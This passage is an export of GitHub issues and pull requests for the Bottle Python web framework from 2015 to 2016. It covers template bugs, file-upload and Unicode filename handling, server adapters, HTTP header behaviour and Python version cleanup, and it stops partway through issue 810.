877,More Python 2.6\3.0 clean up,2016-08-27T20:09:16Z,2016-08-28T14:13:14Z,,,,"HI Marcel, 

I removed some more old deprecated code which is no longer needed..

Also, this https://github.com/bottlepy/bottle/blob/master/bottle.py#L130
can also be removed, since all supported versions have this key word.

All https://hg.python.org/cpython/file/3.{2,3,4,5}/Lib/keyword.py have `as`.

Finally, can you give a hint when is Version to be released 0.13?
"
876,Add WSGIserver support,2016-08-12T16:53:28Z,,"Request, Undecided",,,"https://fgallaire.github.io/wsgiserver/
"
875,include() should honour current indentation level for all lines,2016-08-12T08:28:45Z,,,,,"Using include() should render the included template with indentation level equal of the indentation of the include function itself for all lines to keep things pretty. It actually does it only for the first line.  

```
template1.tpl:
<html>
    % include('template2')
</html>

template2.tpl:
some 
more 
html

```

is rendered 

```
<html>
    some
more
html
</html>
```

while it probably should be:

```
<html>
    some
    more
    html
</html>
```

I understand that it would break backwards compatibility so maybe an optional param could be used for this behaviour. It will also allow using the same template nested in different indentation levels keeping the proper indentation.
"
874,embed python code token be settable,2016-08-12T02:43:25Z,2016-08-12T04:40:14Z,,,,"In vim, syntax highlight breaking when use quote mark in embed python code section.
This problem causes when open template as html
See attached picture.
![2016-08-12 11 57 21](https://cloud.githubusercontent.com/assets/7894040/17611652/2a180802-6084-11e6-8a2d-22eeba90e3bd.png)

I want to change token string from `<% %>` to `{% %}' to resolve this problem.
But now it cannot change.

I considered change template to jinja2, but jinja2 is not simple.

Certainly jinja2 is powerful and beautiful, but it is not simple.
So I want to use SimpleTemplate instead of jinja2 without syntax color issue.

Please code token be settable or selectable. (`<% %>` or `{% %}')
"
873,How to use static file easily?,2016-08-06T07:31:03Z,2016-08-06T08:30:05Z,,,,"I developed a blog with bottlepy,but I want to use a logo picture for every page,except use static_file function,have other methods to solve this problem?
"
872,Clean python 2.6,2016-08-05T09:58:57Z,2016-08-26T14:57:52Z,,,,"We are almost 2 years after end of life ...

PEP-361:
Oct 29 2013: Python 2.6.9 final released (security-only)

Python 2.6 should be removed, really. 
"
871,Clean python 2.6 - No body should be using it anymore it's EOL,2016-08-05T09:30:29Z,2016-08-05T09:39:24Z,,,,"We are almost 2 years after end of life ...

PEP-361:
    Oct 29 2013: Python 2.6.9 final released (security-only)
"
870,bottle 0.12.9 PyPI package: touni doesn't contain None to empty string fix,2016-08-05T04:38:49Z,2017-05-14T10:26:40Z,,,,"When you install the newest bottle version with pip you get the following behavior:

```
>>> from bottle import template
>>> template('{{foo}}', foo=None)
'None'
```

In #562 from 2013 this got fixed so that it returns an empty string instead, and the fix is currently [in the master branch](https://github.com/bottlepy/bottle/blob/master/bottle.py#L199), however it somehow isn't in the bottle 0.12.9 PyPI package.

@defnull You could probably update that package to contain the fix, because this is quite inconvenient when setting the value of HTML inputs.
"
869,"SimpleTemplate, object / string confusion",2016-08-03T11:03:55Z,2016-08-03T12:10:29Z,,"AttributeError, TypeError","AttributeError: 'str' object has no attribute 'id', TypeError: string indices must be integers, not str","In a simple template file I get an object variable (eg `element`) that has some attributes which are also objects (eg. `check_command`).

In my template:

```
%name = 'check_command'
%value = element[name]
{{name}} = '{{value}}',  - {{type(value)}}
```

gives me: 

```
check_command = '<command, id: 57a19eb806fd4b15409677c4, name: check_host_alive, status: unknown>', <class 'alignak_webui.objects.item_command.Command'>
```

which is what I expect: the name of my attribute, followed by its value and the type of the value. Note that the type of this value is a class because my attribute contains an object.

But when I want to get this value object attributes, I get an AttributeError exception because my object is now considered as a string ! When dumped, the value is an object, but when used it is a string ... did I missed something ?

```
{{type(value)}} - {{value.id}}
AttributeError: 'str' object has no attribute 'id'
```

```
{{type(value)}} - {{value['id']}}
TypeError: string indices must be integers, not str
```

```
{{type(value)}} - {{getattr(value, 'id')}}
AttributeError: 'str' object has no attribute 'id'
```
"
868,Add Support for UVLoop and custom asyncio loop option,2016-07-29T15:29:41Z,2016-08-26T15:00:33Z,,,,"- added custom asyncio loop ServerAdapter
- added UVLoop server option
"
867,"new plugin: canister (provides logs, sessions, oauth2 support...)",2016-07-22T12:40:57Z,,,,,"Hi,

I made a little plugin for bottle which might be of interest:
https://github.com/dagnelies/canister

It provides the usual ""nice to have"" stuff:
- formatted logs
- url and form params unpacking
- sessions (server side) based on a session_id cookie
- authentication through basic auth or bearer token (OAuth2)
- CORS for cross-domain REST APIs

...in case someone is interested.
"
866,Jinja2Template: Pass filename to Jinja2,2016-07-15T00:59:18Z,2016-08-26T16:48:43Z,,,,"For readable stacktrace from jinja2
"
865,Add support for flipflop fastCGI connector,2016-07-14T16:44:17Z,2016-08-26T17:16:03Z,,,,
864,remove deprecated logic from GeventServer,2016-07-09T08:44:30Z,2016-07-11T10:45:02Z,,,,"gevent.wsgi just backwards compatibility alias for gevent.pywsgi, `fast` option was useless.
see:
http://www.gevent.org/gevent.wsgi.html
https://github.com/gevent/gevent/commits/v1.1.1/gevent/wsgi.py
"
863,Bottle behind Apache,2016-07-06T08:05:29Z,2016-07-26T14:27:27Z,,,,"Hi all,
is there a guide to use Bottle behind Apache with the module wsgi_module ?
I've found something but I can't split the routes on multiple modules.
Is it possible?
Thank you

Claudio
"
862,port bottle cli optparse to argparse where possible,2016-07-06T00:19:46Z,2016-09-12T14:28:38Z,,,,"- use argparse in CLI where possible (2.7+)

Note: I'm not sure this should be merged against master...can someone let me know the right merge target if so? And assuming this PR is useful for the project.
"
861,Added ETag support to static_file(),2016-07-05T11:31:57Z,2016-07-05T11:40:14Z,,,,
860,Example behaves as a synchronous server,2016-06-30T15:56:11Z,2016-06-30T17:55:53Z,,,,"monkey.patch_all () without this line the server responds to requests synchronously

``` python
from bottle import request, Bottle, abort
from gevent import monkey
import time

monkey.patch_all()
app = Bottle()


@app.get(""/example"")
def example():
    print(""init"")
    time.sleep(2)
    print(""end"")


@app.route('/websocket')
def handle_websocket():
    wsock = request.environ.get('wsgi.websocket')
    if not wsock:
        abort(400, 'Expected WebSocket request.')

    while True:
        try:
            message = wsock.receive()
            wsock.send(""Your message was: %r"" % message)
        except WebSocketError:
            break

if __name__ == ""__main__"":
    from gevent.pywsgi import WSGIServer
    from geventwebsocket import WebSocketError
    from geventwebsocket.handler import WebSocketHandler
    server = WSGIServer((""0.0.0.0"", 9876), app,
                        handler_class=WebSocketHandler)
    server.serve_forever()

```

```
init
init
init
init
end
end
end
end
```

``` python
from bottle import request, Bottle, abort
import time

app = Bottle()


@app.get(""/example"")
def example():
    print(""init"")
    time.sleep(2)
    print(""end"")


@app.route('/websocket')
def handle_websocket():
    wsock = request.environ.get('wsgi.websocket')
    if not wsock:
        abort(400, 'Expected WebSocket request.')

    while True:
        try:
            message = wsock.receive()
            wsock.send(""Your message was: %r"" % message)
        except WebSocketError:
            break

if __name__ == ""__main__"":
    from gevent.pywsgi import WSGIServer
    from geventwebsocket import WebSocketError
    from geventwebsocket.handler import WebSocketHandler
    server = WSGIServer((""0.0.0.0"", 9876), app,
                        handler_class=WebSocketHandler)
    server.serve_forever()

```

```
init
end
init
end
init
end
init
end
```
"
859,static_file() check modified bug,2016-06-23T17:46:19Z,2016-07-05T09:55:26Z,,,,"if a url mapping tow difference file,for examples:
/a/b/c.html => when user is a ,return c1.html
/a/b/c.html => when user is b ,return c2.html

bu if when use static_file(), only use ""HTTP_IF_MODIFIED_SINCE""  ，if c2 modified time < c1 modified time , user always see c1.html , must delete browser cache or append random params to url
"
858,Added support for uvwsgi server,2016-06-17T16:32:31Z,2016-06-19T15:32:36Z,,,,"Now supporting a fast lubuv based server uvwsgi.
"
857,"make it possible to provide a logger for gevent (before, the logger would be replaced by 'default')",2016-06-06T19:21:42Z,2016-06-19T15:33:29Z,,,,
856,POST file upload crashes on cgi.FieldStorage() [Python 3.4],2016-06-06T19:13:18Z,2016-06-13T20:00:21Z,Undecided,TypeError,"TypeError: must be str, not bytes","With an [Android app](http://photobackup.github.io) using [OkHttp](http://square.github.io/okhttp/) for file upload through a POST request, I get the following error:

```
Traceback (most recent call last):
  File ""/home/stephane/code/photobackup/server-bottle/venv/bin/bottle.py"", line 862, in _handle
    return route.call(**args)
  File ""/home/stephane/code/photobackup/server-bottle/venv/bin/bottle.py"", line 1732, in wrapper
    rv = callback(*a, **ka)
  File ""/home/stephane/code/photobackup/server-bottle/venv/lib/python3.4/site-packages/photobackup_bottle/photobackup.py"", line 102, in save_image
    validate_password(request)
  File ""/home/stephane/code/photobackup/server-bottle/venv/lib/python3.4/site-packages/photobackup_bottle/photobackup.py"", line 78, in validate_password
    password = request.forms.get('password').encode('utf-8')
  File ""/home/stephane/code/photobackup/server-bottle/venv/bin/bottle.py"", line 166, in __get__
    if key not in storage: storage[key] = self.getter(obj)
  File ""/home/stephane/code/photobackup/server-bottle/venv/bin/bottle.py"", line 1084, in forms
    for name, item in self.POST.allitems():
  File ""/home/stephane/code/photobackup/server-bottle/venv/bin/bottle.py"", line 166, in __get__
    if key not in storage: storage[key] = self.getter(obj)
  File ""/home/stephane/code/photobackup/server-bottle/venv/bin/bottle.py"", line 1232, in POST
    data = cgi.FieldStorage(**args)
  File ""/usr/lib/python3.4/cgi.py"", line 559, in __init__
    self.read_multi(environ, keep_blank_values, strict_parsing)
  File ""/usr/lib/python3.4/cgi.py"", line 714, in read_multi
    self.encoding, self.errors)
  File ""/usr/lib/python3.4/cgi.py"", line 561, in __init__
    self.read_single()
  File ""/usr/lib/python3.4/cgi.py"", line 724, in read_single
    self.read_binary()
  File ""/usr/lib/python3.4/cgi.py"", line 746, in read_binary
    self.file.write(data)
TypeError: must be str, not bytes
192.168.0.21 - - [06/Jun/2016 20:58:04] ""POST / HTTP/1.1"" 500 744
```

It seems related to #567 (something around cgi.FieldStorage) but I don't see what I can do to fix the problem. Any idea?

There are two parameters and a file in the request. An example of headers is:
- User-Agent: PhotoBackup Android Client v0.8.1-dev
- Via: 1.1 vegur
- Host: requestb.in
- Accept-Encoding: gzip
- Content-Length: 1795216
- Total-Route-Time: 0
- X-Request-Id: 08838f63-da70-4318-8c78-665fb8ddcd99
- Content-Type: multipart/form-data; boundary=7f03fd45-e2b9-4f68-9d7d-50fd64dcb0a1
- Connect-Time: 1
- Connection: close
"
855,FileUpload.filename cut off multi-byte characters (only extension is left),2016-06-06T09:26:08Z,,Request,,,"I'm just trying update my product's bottle.py 0.11 to 0.12; and found objects in `Request.files` changed to new class `FileUpload` from `cgi.FieldStorage`.

They are not compatibile and have difference with `filename`:
- filename of `cgi.FieldStorage` returns client-side file name
- [filename of `FileUpload`](master/bottle.py#L2572) returns SAFE-FILE-NAME for saving which cut off non-ASCII and path separator 

Those changes make hardly problem in multi-byte culture.
If user upload file with non-ASCII named file, we got **only extension** of filename with `FileUpload.filename`.

For example: 
`あいうえお.txt`
 v  cut off non-ascii
`.txt`
 v  strip '.'
`txt`

We can also use raw_filename insteadly, but
1. need to care 'raw' or 'not' of filename for simply display filename of user uploaded is nonsense.
2. `filename` of non-ASCII named become meaningless and less safe for name uniqueness.

For problem 1:
Renaming `raw_filename`/`filename` to `filename`/`safe_filename` is most best solution, I think.
Most of non-expert user use `save` method. Or use 'safe_' prefixed for saving. Thus security affect of this changes would be minimal.

FYI, as for my product, files are managed with sequence number. Filenames are stored on DB for user can identify them. so no need to make filename safe.

For problem 2:
Apply percent or some other escaping instead of cut off, is suboptimal to continuing current way.
This may also solve part of problem 1, escaped strings is a enough hint to use `raw_filename`.

Anyway, cutting off is bad idea and hope fix this.
Naming file with only Japanese characters is very neutral for ordinaly people in Japan. Might be same in Chinese or other non-ASCII countries.

thanks

seems related:
https://github.com/bottlepy/bottle/issues/582
"
854,Can't set cookies when returning redirect,2016-06-03T17:08:49Z,2016-06-03T17:14:19Z,,,,"With latest bottle.py version it seems that `set_cookie` doesn't work when used with `return redirect`. With older versions it worked fine. Now I'll need to return short web page which contains HTML refresh to get cookies set and then redirect the user to appropriate URL.
"
853,Add support for TLS,2016-05-31T06:10:42Z,,,,,"It would be nice to have support for TLS for more secure connections. At least for the WSGIRef server this should be quite easily possible to accomplish by using ssl.wrap_socket().
"
852,Files with Certain Unicode Characters Don't Upload,2016-05-24T16:00:10Z,2016-06-20T07:43:02Z,,,,"Client Code

```
>>> r = requests.post(""http://server/upload"", files={""file"": (u'\u0412\u0430\u043b\u044e\u0442\u043d\u043e\u0435\u0437\u0430\u043a\u043e\u
043d\u043e\u0434\u0430\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e.\u0420\u0438\u0441\u043a\u0438\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u043a\u0438\
u0442\u0430\u043c\u043e\u0436\u0435\u043d\u043d\u043e\u0439\u0441\u0442\u043e\u0438\u043c\u043e\u0441\u0442\u0438.doc', file_bytes)})
```

Server Code

```
@route(""/upload"", method='POST')
def upload():
    if request.files.file != """":
        data = request.files.file
    else:
        data = None

    if data is None:
        abort(400, ""No file provided"")

    return {""status"": ""success""}
```

Result:

```
>>> r.status_code
400
>>> r.text
'...No file provided..'
```
"
851,What exactly is a SomeAsyncWorker,2016-05-13T09:12:59Z,2016-05-24T04:07:11Z,,,,"Stumbled upon this [SO question](http://stackoverflow.com/questions/20824218/how-to-implement-someasyncworker-from-bottle-asynchronous-primer)

In the page [Primer to Asynchronous Applications - EVENT CALLBACKS](http://bottlepy.org/docs/dev/async.html?highlight=worker#event-callbacks), it says 

```
In order to conform to the WSGI standard, all we have to do is to return a body iterable that we can write to asynchronously
...
```

``` @route('/fetch')
def fetch():
    body = gevent.queue.Queue()
    worker = SomeAsyncWorker()
    worker.on_data(body.put)
    worker.on_finish(lambda: body.put(StopIteration))
    worker.start()
    return body
```

How does one create a `SomeAsyncWorker`? What exactly is this?
"
850,"using generators, setting content-type prevent data being transferred immediately",2016-05-08T21:04:55Z,2016-05-09T16:13:51Z,,,,"From the sample code [here](http://bottlepy.org/docs/dev/async.html#greenlets-to-the-rescue), if we add Content-Type header all data is transferred after 8 seconds.

```
from gevent import monkey; monkey.patch_all()

from time import sleep
from bottle import route, run, response

@route('/stream')
def stream():
    response.set_header('Content-Type', 'text/plain')   # <- here the change
    yield 'START'
    sleep(3)
    yield 'MIDDLE'
    sleep(5)
    yield 'END'

run(host='0.0.0.0', port=8080, debug=True, server='gevent')
```
"
849,STPL failure in the presence of escaped \% end followed by % end,2016-05-06T22:42:08Z,2016-05-07T10:06:13Z,,,,"The STPL processing seems to fail if there is a line with just `\% end` immediately followed by a line with just `% end`.

The following script shows up the error:

```
from bottle import SimpleTemplate

# In the following source, there is a ""% end"" immediately following an
# escaped line containing just ""\% end"". which causes a problem
SOURCE1 = '''<input type=""{{ type }}"" name=""{{ name }}""
% if type != 'password':
\% if form.get('{{ name }}'):
 value=""{{ '{{' }} form['{{ name }}'] }}""
\% end
% end
/>'''

# In the following source, the two lines containing ""\% end"" and ""% end"" are
# separated by a blank line, which leads to better behaviour, except that
# the blank line is swallowed.
SOURCE2 = '''<input type=""{{ type }}"" name=""{{ name }}""
% if type != 'password':
\% if form.get('{{ name }}'):
 value=""{{ '{{' }} form['{{ name }}'] }}""
\% end

% end
/>'''

DATA = {
    'username': 'foo',
    'password': 'bar',
}

for source_name in 'SOURCE1', 'SOURCE2':
    source = globals()[source_name]
    print('%s:' % source_name)
    t1 = SimpleTemplate(source).render(type='text', name='username', form=DATA)
    print(t1)
    print('-' * 72)
    t2 = SimpleTemplate(source).render(type='password', name='password', form=DATA)
    print(t2)
    print('=' * 72)
```

When run, the above script produces

```
SOURCE1:
<input type=""text"" name=""username""
% if form.get('username'):
value=""{{ form['username'] }}""
% end
 end
/>
------------------------------------------------------------------------
<input type=""password"" name=""password""

========================================================================
SOURCE2:
<input type=""text"" name=""username""
% if form.get('username'):
value=""{{ form['username'] }}""
% end
/>
------------------------------------------------------------------------
<input type=""password"" name=""password""
/>
========================================================================
```

This is with Bottle v0.12.9, Python 3.4.3, on Linux.
"
848,How to use HTML,2016-04-28T14:55:14Z,2016-05-03T03:21:30Z,,,,"I have developed a blog program,but i don't know how to use html weight.like CheckBox,select,radiobox and so on,Can you give me a example?
"
847,POST forms type=float error,2016-04-14T22:27:58Z,2016-04-16T00:20:43Z,,TypeError,TypeError: float() argument must be a string or a number,"what is wrong get compra as float?

route(""/new"", method=""POST"")
def new_item():
    """"""
    Add a new item
    """"""
    descripcion = request.forms.get('descripcion')
    compra = request.forms.get('compra', type=float)
    venta = request.forms.get('venta')
    pesos = request.forms.get('pesos')
    proveedor = request.forms.get('proveedor')
    stock = request.forms.get('stock')

```
pevendedor = float(compra)*1.15
publico = float(compra)*1.27
```

Traceback (most recent call last):
  File ""/Library/Python/2.7/site-packages/bottle.py"", line 862, in _handle
    return route.call(*_args)
  File ""/Library/Python/2.7/site-packages/bottle.py"", line 1732, in wrapper
    rv = callback(_a, *_ka)
  File ""/Users/hoguera/Documents/Bottle/bottle/Genesis/inicio_viejo.py"", line 76, in new_item
    pevendedor = float(compra)_1.15
TypeError: float() argument must be a string or a number
"
846,Update changelog.rst indentation,2016-04-06T21:34:28Z,2016-05-03T18:25:11Z,,,,"Cleaned up the spacing so that it properly renders
"
845,Bottle app running on Paste or CherryPy or any other server cannot handle chunked input,2016-04-05T18:00:52Z,,Bug,,,"I am trying to run this curl command:
curl -H'Transfer-Encoding: chunked' -F'audio=@bar.wav' -F'text={""key"": ""value""}' -F'image=@foo.jpg' localhost:8085/upload

against this application:

---

import paste
from bottle import Bottle, route, error, post, get, response, request, template
app = Bottle()
@app.post('/upload')
def upload():
    print ""Files: "", request.files['image'].filename, ""|"", request.files['audio'].filename
    print ""Forms: "", request.forms['text']
    print ""Content-Length: "", request.headers['Content-Length']
    print ""Content-Type: "", request.headers['Content-Type']
    print ""Contents of File ["", request.files['image'].name, ""]: "", request.files['image'].file.readlines()
    print ""Contents of File ["", request.files['audio'].name, ""]: "", request.files['audio'].file.readlines()  
    return {""message"": ""OK""}

---

When I use the internal wsgiref server in Bottle to run this code as:
       app.run(host='localhost', port=8085, reloader=True)
the files upload OK and the output gets printed but if I use the third-part server ('paste' for example) as
       app.run(server='paste', host='localhost', port=8085, reloader=True)
then I get an error saying ""Error while parsing chunked transfer body.""

What am I doing wrong?

Thanks,
Amit
"
844,Not Support Expect:100-continue (HTTP/1.1),2016-04-03T04:37:26Z,,,,,"libcurl will send http/1.1 head  `Expect:100-continue`  by default. this will cause a 2 second wait for any huge data post requset.

```
version  0.13-dev,python 2.6.6

usage:
$python -m bottle test_module
```
"
843,Order of operations for route filters and route selection not documented,2016-04-01T16:57:32Z,,,,,"Basically, due to how routes are compiled down to a regex and then appended to a list, you can sometimes manage to mask other routes by mistake. Consider the following routes:
1. `/app/dashboard`
2. `/app/<app:path>`
3. `/app/config/<who>`

How does it work in practice? (At least as far as I've seen)
- `/app/dashboard` will work, as it is a static route, and therefore checked before regexes.
- `/app/notepad/mynotes` will resolve to `/app/<app:path>` as expected.
- `/app/config/me` will **NOT** resolve to `/app/config/<who>`, but instead to `/app/<app:path>`, as that regex is checked before `/app/config/<who>`, and matches.

I'd recommend either documenting in the routing docs that order of route definition matters, or sort routes based on the constant length, in other words, how many characters there is before a wildcard shows up.
"
842,Inherit template's syntax while rendering sub-templates,2016-03-31T23:00:15Z,2016-05-03T18:25:37Z,,,,"Otherwise the custom syntax will not apply to ""include""-d templates
"
841,Explicitly flush wsgi.errors after writing errors,2016-03-29T17:09:25Z,2016-10-19T10:59:24Z,,,,"uwsgi is impolite and supplies a block-buffered object for wsgi.errors.  The result is that exception traces get lost or severely delayed.

Please consider adding a call to environ['wsgi.errors'].flush() after all the writes to wsgi.errors to force the errors out to the log.
"
840,fix invalid badge links,2016-03-27T08:58:52Z,2016-05-03T18:26:10Z,,,,"change badge links from https://pypip.in/ to https://img.shields.io/pypi/
"
839,Fail to retrieve Content-Length from the HTTP response header,2016-03-01T09:57:47Z,,,ValueError,ValueError: invalid literal for int() with base 10: '',"I'm using bottle v0.12.9. For my web app I need to retrieve the Content-Length value. I tried both
approaches:
i) response.get_header('Content-Length') -> returned None
ii) response.content_length -> returned empty string ''

Error msg for the latter:

File ""/Library/Python/2.7/site-packages/bottle.py"", line 1416, in **get**
    return self.reader(value) if self.reader else value
ValueError: invalid literal for int() with base 10: ''

Thanks.
"
838,Add PyPI classifier for Py 3.4 and 3.5,2016-02-27T08:34:50Z,2016-02-27T11:25:15Z,,,,"fixes #837
"
837,about Python3.5,2016-02-25T10:11:41Z,2016-02-27T11:25:15Z,,,,"I found bottlepy is not work when I update to Python3.5,can you tell me how to deal with?
"
836,Python 3.4.3 & Bottle with CGI - environ['REQUEST_METHOD'] issue,2016-02-24T17:31:50Z,,,KeyError,KeyError: 'REQUEST_METHOD',"I am trying to use Python 3.4.3 and Bottle 0.12.8 to run a simple webservice using cgi. I am running the below script from my Linux system. I was able to run the the same service without CGI. 

---

import bottle
from bottle import route, run, request, response

host = 'XXXX'
port = '8080'
debug = 'False'

@route('/hello/',  method=['OPTIONS','GET'])
def hello():
    return(""Success"")

bottle.run(host=host, port=port,debug=debug,server='cgi')
# bottle.run(host=host, port=port,debug=debug)

---

I get the below error, when I run the service with CGI- 

Traceback (most recent call last):
  File ""/usr/local/lib/python3.4/site-packages/bottle.py"", line 858, in _handle
    route, args = self.router.match(environ)
  File ""/usr/local/lib/python3.4/site-packages/bottle.py"", line 413, in match
    verb = environ['REQUEST_METHOD'].upper()
KeyError: 'REQUEST_METHOD'
<h1>Critical error while processing request: </h1><h2>Error:</h2>

<pre>
KeyError(&#039;REQUEST_METHOD&#039;,)
</pre>

<h2>Traceback:</h2>

<pre>
Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.4/site-packages/bottle.py&quot;, line 957, in wsgi
    or environ[&#039;REQUEST_METHOD&#039;] == &#039;HEAD&#039;:
KeyError: &#039;REQUEST_METHOD&#039;

</pre>

Status: 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=UTF-8
Content-Length: 374

<h1>Critical error while processing request: </h1><h2>Error:</h2>

<pre>
KeyError(&#039;REQUEST_METHOD&#039;,)
</pre>

<h2>Traceback:</h2>

<pre>
Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.4/site-packages/bottle.py&quot;, line 957, in wsgi
    or environ[&#039;REQUEST_METHOD&#039;] == &#039;HEAD&#039;:
KeyError: &#039;REQUEST_METHOD&#039;

</pre>

---

Am I doing something wrong here or is it a bug or non-compatibility between python and bottle version. Any pointers would help.
Thanks,
"
835,Fix spelling,2016-02-17T18:18:16Z,2016-02-17T18:20:43Z,,,,
834,Fix typo in doc code snippet,2016-02-13T15:06:44Z,2016-05-03T18:26:58Z,,,,
833,WaitressServer: pass self.options to serve method,2016-02-12T15:48:32Z,2016-05-03T18:27:12Z,,,,
832,Fix coding style,2016-02-12T14:37:23Z,2016-02-12T15:28:19Z,,,,"```
This patch will close #823
```
"
831,"WaitressServer, pass self.options to serve",2016-02-12T13:21:59Z,2016-02-12T15:33:08Z,,,,"pass all options to the WaitressServer adapter, this will allow to set the number of treads via bottle.run
"
830,Mixin args into kwargs earlier in template(),2016-02-06T09:54:05Z,2016-02-12T10:11:52Z,,,,"In short: `@view('some_template', template_lookup='./app/my_vews')` won't work

I want to add a lookup-path for templates in my app, so I hook `view` and add `temlate_lookup` to kwargs but it doesn't work.

``` python
from . import bottle
from .bottle import route, request, response

from . import config

view = functools.partial(bottle.view, template_lookup=[config.PATH + '/pages'])
```

This patch fix the problem by mixin args earlier.
"
829,Bottle incorrectly sets Content-Length header when status is 204,2016-02-05T23:26:42Z,2016-02-12T15:15:18Z,,,,"Per [RFC 7230 3.3.2 p31](https://tools.ietf.org/html/rfc7230#section-3.3.2):

> A server MUST NOT send a `Content-Length` header field in any response with a status code of `1xx (Informational)` or `204 (No Content)`.

Unfortunately, Bottle does send the `Content-Length` header.

Minimal code example:

```
@delete('/foo')
def delete_foo():
    response.status = 204
    return response
```

Curl:
`curl 'http://localhost:8080/foo' -X DELETE -vvv`

Response:

```
HTTP/1.1 204 No Content
Content-Length: 0
Date: Fri, 05 Feb 2016 23:22:43 GMT
Server: myserver
```
"
828,Typo in test_app doc,2016-02-05T15:41:57Z,2016-02-12T09:52:25Z,,,,
827,Is bottle.py ok for production?,2016-01-29T17:32:59Z,2016-02-12T15:16:09Z,,,,"Is bottle.py ok for production?
"
826,"waitress, pass all options",2016-01-29T06:44:52Z,2016-07-26T10:32:52Z,,,,"the current implementation of the waitress adapter only passes self.host and self.port as an argument to serve(). but waitress accepts some more options, like ""threads"" would it make sense to call serve like this?

```
serve(handler, host=self.host, port=self.port, **self.options)
```
"
825,Plugin execution order,2016-01-22T14:29:48Z,2016-01-22T20:34:43Z,,,,"It would appear that global plugins are not called in an expected order.

For example;

``` python
bottle.install(DatabasePlugin())
bottle.install(PluginThatNeedsDatabase())
```

The above would first call `PluginThatNeedsDatabase()`and then `DatabasePlugin()`. 

This goes against the advice seen in [documentation](http://bottle.readthedocs.org/en/latest/tutorial.html#application-wide-installation);

> The order of installed plugins is significant, though. If a plugin requires a database connection, you need to install the database plugin first.

As you can see from our example though, the database plugin cannot be installed first, otherwise dependant plugins will not work correctly.

You can see a full demonstration of this in action [here](http://blog.bilak.info/2015/07/05/bottle-plugin-lifecycle/).

I would argue that the execution order of app plugins and view plugins should be the same, but as you can see from this [line](https://github.com/bottlepy/bottle/blob/master/bottle.py#L595), this is not the case. There are also backwards compatibility concerns with such a fix, given that it will almost certainly break every app in existence with plugin dependancies.

Thoughts @defnull ?
"
824,Request.set_cookie(httponly=False) still sets the httponly flag.,2016-01-20T18:08:08Z,2016-02-12T15:24:29Z,Bug,,,"This is actually a bug in the stdlib Morsel implementation, which only checks if the key is present and ignores its value. Same goes for the 'secure' flag.
"
823,Extra semi-colon,2016-01-19T17:21:01Z,2016-02-12T15:25:07Z,,,,"There is a semi-colon at the end of a one-line statement inside `Bottle._handle`:

```
return out;
```

This is not a bug or any big deal, but can be confusing at the first sight. 
If necessary, I can fix this and send a PR. 
"
822,Fixing initial copyright year,2016-01-18T11:10:55Z,2016-02-09T17:00:55Z,,,,"According to http://www.copyright.gov/circs/circ01.pdf , document should list its first year of publication in its copyright

As the license was applied back in 2011 ( As per the commit - 4047cda0ab5aaa ), therefore creating a range from 2011-2016
"
821,Import module hashlib and change default hashing algorithm of HMAC from MD5 to SHA256,2016-01-14T01:26:39Z,2016-02-12T09:53:10Z,,,,"By default, Python's HMAC algorithm uses MD5 (see https://docs.python.org/2/library/hmac.html) which is deemed as cryptographically broken and unsuitable for further use. This change makes SHA256 the default and also allows users to select the hashing function being used a runtime.
"
820,Unable to set charset property (as presented in the official tutorial),2016-01-13T16:00:59Z,,,,,"Hello (again)

The official tutorial explain that we can set the charset of the response like that 

``` python
response.charset = 'ISO-8859-15'
```

However in the code, charset is just a read only property. I don't know if it was also a writable property in the past but If you want I can make a PR either by removing this from the doc, or making this property writable. 
What do you think?
"
819,Response's charset ignored when returning a dictionary (as json),2016-01-13T15:56:22Z,2016-02-12T15:27:34Z,,,,"Hello,
First of all thanks a lot for the great tool, it's the best and the simplest lib to create API with python.

I saw that when returning a dict, it is automatically converted to json and the content-type header is automatically set to `application/json`.
That's nice but in this case the charset is ignored. Usually, we want the content-type to be `application/json; charset=utf-8`
(the charset can be different for those who explicitly set another charset before returning the dict, but now there is no way to set the charset in the response when returning a dict.

I think this happens at line 1960 (in bottle.py master):

``` python
    if isinstance(rv, dict):
        #Attempt to serialize, raises exception on failure
        json_response = dumps(rv)
        #Set content type only if serialization successful
        response.content_type = 'application/json'
        return json_response
```

Maybe we can have something like this instead:

``` python
    response.content_type = 'application/json; charset=' + response.charset
```

what do you think?
"
818,Fix spacing in Recipe doc,2016-01-13T01:23:27Z,2016-01-17T04:40:15Z,,,,"This is a small, silly change. The spacing was 8 spaces in rather than 4.
"
817,Bottle and Interactive shell,2016-01-04T10:16:31Z,,,,,"Is it possible to create a python file that starts Bottle but then opens an interactive shell within the browser so that I can open up a pre built python script?

Basically I have a fully functional python script that I wish to access via a web browser on my local network. It feels like I can use Bottle to achieve this?
"
816,Catching redirect exception which is raised in before_request hook,2015-12-30T15:34:14Z,2016-01-10T21:03:04Z,,,,"Catching redirect exception which is raised in before_request hook. 

This an attempt to fix issue #815 
"
815,redirecting in befoe_request hook is not working as before,2015-12-30T15:21:22Z,,,,,"Redirecting to a new URL is done via raising a HTTPResponse exception in Bottle. I think after https://github.com/bottlepy/bottle/commit/d85a6983ceedacd9ab9afbcd027139d8773b67ac this commit, this exception is not catched in Bottle._handle() method if redirecting is made in a before_request hook. 
"
814,ResourceWarning unclosed <socket.socket>,2015-12-26T16:02:55Z,,,,,"Hi,

When quitting a Bottle app using ^C and the built-in webserver, I get this message in the console:

```
/bottle.py:3119: ResourceWarning: unclosed <socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8080)>
```

Then, it hangs, and I have to ^C a second times to exit.

It should not be a big deal, but I never saw it before. Is it due to some recent changes? Thanks!
"
813,Remove 2.5 and 3.1 things,2015-12-21T11:24:49Z,2016-01-10T21:03:45Z,,,,"Removing unecessary 2.5 test dependencies
Delete some 2.5 and 3.1 things
"
812,remove py25 on tox file,2015-12-13T20:00:48Z,2015-12-13T21:28:56Z,,,,
811,Fix charset for application/javascript files,2015-12-12T21:32:10Z,2015-12-13T16:12:55Z,,,,
810,Fixed Jinja2 File Templates unusable since e456b4f,2015-12-12T17:08:59Z,2015-12-13T16:12:46Z,,,,"This patch re-establish the possibility to use jinja2 templates.

Example, without it:

```
$ cat views/hello.tpl 
Hi!
```

```
$ cat hello.py 
from bottle import jinja2_template

print(jinja2_template('hello'))
```

```
$ python hello.py
[...]
    ""Refer to templates with names or paths relative to the lookup path."")
